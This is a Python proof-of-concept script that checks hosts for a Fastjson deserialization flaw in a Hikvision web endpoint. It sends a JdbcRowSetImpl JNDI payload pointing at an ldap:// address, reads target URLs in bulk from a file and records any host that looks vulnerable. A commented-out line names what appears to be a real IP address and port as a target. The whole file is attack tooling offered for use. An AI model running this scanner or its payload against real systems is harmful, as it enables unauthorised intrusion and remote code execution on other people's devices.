#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：Hikvision_fastjson 
@File    ：Poc_Hikvision_Fastjson.py
@IDE     ：PyCharm 
@Author  ：0x95
@Date    ：12/1/2022 11:38 PM 
'''

import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#burp0_url = "https://122.224.117.62:1443/bic/ssoService/v1/applyCT"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate",
    "Dnt": "1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-User": "?1",
    "Te": "trailers",
    "Connection": "close",
    "Content-Type": "application/json"
}
payload_json={
    "a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
    "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
          "autoCommit": True,
          "dataSourceName": "ldap://0.0.0.0"},
    "hfe4zyyzldp": "="
}
payload_url = "/bic/ssoService/v1/applyCT"
fname = r"."
#requests.post(burp0_url, headers=headers, json=payload_json)

def Poc(url):
    if('https' in url):
        pass
    else:
        url = 'http://' + url
    url = url + payload_url
    try:
        req = requests.post(url,headers=headers,json=payload_json,verify=False)
        if ('code' in req.text) or (req.status_code == 500):
            print(url + ' Maybe Hikvision Fastjson Vuln')
            localTime = 'result-' + time.strftime("%Y%m%d%H", time.localtime())
            name = localTime + '.txt'
            a = open('./result/'+name,'a+')
            a.write(url+'\n')
            a.close()
    except Exception as e:
        pass

def urlDispose():
    for i in open('url.txt'):
        i = i.replace('\n','')
        Poc(i)


if __name__ == '__main__':
    urlDispose()
